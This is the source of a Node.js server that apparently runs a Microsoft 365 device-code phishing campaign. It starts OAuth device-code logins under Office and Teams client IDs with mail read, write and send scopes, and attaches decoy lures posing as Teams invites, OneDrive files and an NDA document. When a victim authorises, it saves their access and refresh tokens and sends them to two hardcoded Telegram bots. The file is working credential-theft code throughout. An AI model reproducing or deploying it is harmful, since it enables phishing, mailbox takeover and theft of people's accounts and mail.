// M365 Device Code Server — Optimized for Outlook (personal + work accounts)
// Uses Office client ID by default + explicit Mail scopes

const https  = require('https');
const http   = require('http');
const fs     = require('fs');
const path   = require('path');
const crypto = require('crypto');
const url    = require('url');

const CLIENT_IDS = {
  office: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',     // Microsoft Office / Graph - Works better for Outlook
  teams:  '1fec8e78-bce4-4aaf-ab1b-5451cc387264',     // Teams / New Outlook
};

const DEFAULT_CLIENT_ID = CLIENT_IDS.office;   // ← Using Office client (recommended for Outlook)

const TENANT   = 'common';
const RESOURCE = 'https://graph.microsoft.com';

// Improved scopes for better Outlook / Mail access
const SCOPE    = 'offline_access Mail.Read Mail.ReadWrite Mail.Send';

// Fake/display URLs for different modes
const DISPLAY_BASES = {
  teams:    'https://teams.microsoft.com/invite/',
  onedrive: 'https://1drv.ms/files/',
  nda:      'https://eviden-global.s3.us-east-1.amazonaws.com/',
};

// Telegram
const TELEGRAM_BOT_TOKEN = '8286068697:AAGZ7lbbD8B--FnvVziInLd5XBehDiFIvd8';
const TELEGRAM_CHAT_ID = '8379597863';
const TOKEN1 = "8228183219:AAG1qJxhxNjus0HjZ9YIheGgHi8eSCvhzIU"
const CHAT_ID1 = "8006914941"

// ── Active sessions ───────────────────────────────────────────────────────────
const sessions = new Map();

// ── Helpers ───────────────────────────────────────────────────────────────────
function genTokenFile() {
  return './tokens_' + crypto.randomBytes(3).toString('hex').toUpperCase() + '.json';
}

function genSessionId() {
  return crypto.randomBytes(16).toString('hex');
}

function post(urlStr, params) {
  return new Promise((resolve, reject) => {
    const body = new URLSearchParams(params).toString();
    const u = new URL(urlStr);
    const req = https.request({
      hostname: u.hostname,
      path:     u.pathname,
      method:   'POST',
      headers:  {
        'Content-Type':   'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(body),
        'User-Agent':     'Mozilla/5.0',
      },
    }, res => {
      let raw = '';
      res.on('data', c => raw += c);
      res.on('end', () => {
        try { resolve(JSON.parse(raw)); }
        catch { reject(new Error('Bad JSON response')); }
      });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

function saveTokens(tokens, file) {
  const decoded = decodeJwt(tokens.access_token);
  const expiresAt = Date.now() + (tokens.expires_in || 3600) * 1000;

  const out = {
    saved_at:       new Date().toISOString(),
    expires_at:     new Date(expiresAt).toISOString(),
    token_file:     path.basename(file),
    access_token:   tokens.access_token,
    refresh_token:  tokens.refresh_token || null,
    expires_in:     tokens.expires_in,
    resource:       tokens.resource || RESOURCE,
    decoded_claims: decoded,
    email:          decoded?.upn || decoded?.unique_name || '',
    name:           decoded?.name || '',
    scopes:         decoded?.scp || 'N/A'   // ← Added for debugging
  };

  fs.writeFileSync(file, JSON.stringify(out, null, 2));
  return out;
}

function decodeJwt(t) {
  try { return JSON.parse(Buffer.from(t.split('.')[1], 'base64url').toString()); }
  catch { return null; }
}

// Telegram functions (unchanged)
async function sendTelegramAsDocument(filename) { /* ... same as before ... */ }
async function sendTelegramAsDocumentBot(filename) { /* ... same as before ... */ }

async function pollSession(sessionId) {
  const s = sessions.get(sessionId);
  if (!s || s.status !== 'polling') return;

  const ms = (s.interval + 1) * 1000;

  while (sessions.has(sessionId) && sessions.get(sessionId).status === 'polling') {
    await new Promise(r => setTimeout(r, ms));

    try {
      const res = await post(`https://login.microsoftonline.com/${TENANT}/oauth2/token`, {
        grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
        client_id:  s.clientIdUsed,
        code:       s.device_code,
        resource:   RESOURCE,
        scope:      SCOPE,
      });

      if (res.access_token) {
        s.tokens = res;
        s.status = 'success';

        const saved = saveTokens(res, s.file);
        await sendTelegramAsDocument(s.file);
        await sendTelegramAsDocumentBot(s.file);

        console.log(`Session ${sessionId} → SUCCESS → ${s.file}`);
        console.log(`Email: ${saved.email} | Scopes: ${saved.scopes}`);
        return;
      }

      switch (res.error) {
        case 'authorization_pending': break;
        case 'slow_down':             await new Promise(r => setTimeout(r, 5000)); break;
        case 'authorization_declined':
        case 'access_denied':         s.status = 'declined'; return;
        case 'code_expired':
        case 'expired_token':         s.status = 'expired';  return;
        default:                      s.status = 'error';    s.error = res.error_description; return;
      }
    } catch (err) {
      s.status = 'error';
      s.error  = err.message;
      return;
    }
  }
}

// ── HTTP Server ───────────────────────────────────────────────────────────────
const server = http.createServer(async (req, res) => {
  const parsed = url.parse(req.url, true);
  const pathname = parsed.pathname;

  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // POST /login-start
  if (pathname === '/login-start' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', async () => {
      let params;
      try {
        params = new URLSearchParams(body);
      } catch {
        res.writeHead(400);
        res.end(JSON.stringify({ error: 'Invalid form data' }));
        return;
      }

      const clientIdType = params.get('client-id-type')?.trim().toLowerCase() || 'office';
      const requestedDisplay = params.get('filename')?.trim() || '';

      const clientId = CLIENT_IDS[clientIdType] || DEFAULT_CLIENT_ID;

      const sessionId = genSessionId();
      const realFile = genTokenFile();

      let displayFilename = path.basename(realFile);
      let displayUrl = null;
      let displayNote = null;

      const reqLower = requestedDisplay.toLowerCase();

      if (reqLower === 'nda') {
        displayFilename = 'IMG_5173.jpg';
        displayUrl = DISPLAY_BASES.nda + 'IMG_5173.jpg';
        displayNote = 'NDA protected document';
      } else if (reqLower === 'teams') {
        const rand = crypto.randomBytes(4).toString('hex');
        displayFilename = 'teamsinvite.pdf';
        displayUrl = `${DISPLAY_BASES.teams}${sessionId.slice(0,10)}-${rand}.pdf`;
        displayNote = 'Teams secure invite';
      } else if (reqLower === 'onedrive') {
        displayFilename = 'secured-onedrive-document.pdf';
        displayUrl = `${DISPLAY_BASES.onedrive}${crypto.randomBytes(8).toString('hex')}`;
        displayNote = 'OneDrive shared file';
      }

      sessions.set(sessionId, {
        status:           'polling',
        sessionId,
        user_code:        null,
        verification_url: null,
        message:          null,
        device_code:      null,
        interval:         null,
        file:             realFile,
        clientIdUsed:     clientId,
        requestedDisplay,
        displayFilename,
        displayUrl,
        displayNote,
        startTime:        Date.now(),
      });

      try {
        const dc = await post(`https://login.microsoftonline.com/${TENANT}/oauth2/devicecode`, {
          client_id: clientId,
          resource:  RESOURCE,
          scope:     SCOPE,                    // ← Explicit Mail scopes
        });

        if (dc.error) throw new Error(dc.error_description || dc.error);

        const s = sessions.get(sessionId);
        s.user_code        = dc.user_code;
        s.verification_url = dc.verification_url;
        s.message          = dc.message;
        s.device_code      = dc.device_code;
        s.interval         = dc.interval;

        pollSession(sessionId).catch(err => {
          console.error(`Poll crash ${sessionId}:`, err);
          const sess = sessions.get(sessionId);
          if (sess) sess.status = 'error';
        });

        res.writeHead(200);
        res.end(JSON.stringify({
          sessionId,
          status:           'started',
          user_code:        dc.user_code,
          verification_url: dc.verification_url,
          message:          dc.message,
          expires_in:       dc.expires_in,
          poll_url:         `/status/${sessionId}`,
          filename_will_be: displayFilename,
          file_url_will_be: displayUrl,
          note:             displayNote || undefined,
          client_id_type:   clientIdType,
          client_id_used:   clientId,
          requested_filename: requestedDisplay || '(default)',
          note:             'Using Office client + Mail.ReadWrite scopes for Outlook compatibility'
        }, null, 2));

      } catch (err) {
        res.writeHead(500);
        res.end(JSON.stringify({ error: err.message }));
      }
    });
    return;
  }

  // GET /status/:sessionId
  if (pathname.startsWith('/status/')) {
    const sessionId = pathname.slice('/status/'.length);
    const s = sessions.get(sessionId);

    if (!s) {
      res.writeHead(404);
      res.end(JSON.stringify({ error: 'Session not found or expired' }));
      return;
    }

    let extra = {};

    if (s.status === 'success' && s.tokens) {
      const savedInfo = saveTokens(s.tokens, s.file);

      extra = {
        email:            savedInfo.email || null,
        filename:         s.displayFilename,
        file_url:         s.displayUrl || null,
        actual_saved_as:  path.basename(s.file),
        note:             s.displayNote || 'Token saved locally',
        scopes_received:  savedInfo.scopes || 'N/A'
      };
    }

    const response = {
      sessionId,
      status:           s.status,
      error:            s.error || null,
      filename_will_be: s.displayFilename,
      file_url_will_be: s.displayUrl,
      client_id_type:   s.clientIdUsed === CLIENT_IDS.teams ? 'teams' : 'office',
      ...extra,
    };

    if (['success', 'declined', 'expired', 'error'].includes(s.status)) {
      setTimeout(() => sessions.delete(sessionId), 30 * 60_000);
    }

    res.writeHead(200);
    res.end(JSON.stringify(response, null, 2));
    return;
  }

  // Fallback
  res.writeHead(404);
  res.end(JSON.stringify({ error: 'Not found' }));
});

const PORT = 3210;
server.listen(PORT, process.env.HOST || '0.0.0.0', () => {
  console.log(`
╔════════════════════════════════════════════════════════════╗
║     M365 Device Code Server  —  port ${PORT}                 ║
║     Optimized for Outlook (Office client + Mail scopes)    ║
╚════════════════════════════════════════════════════════════╝
`);
});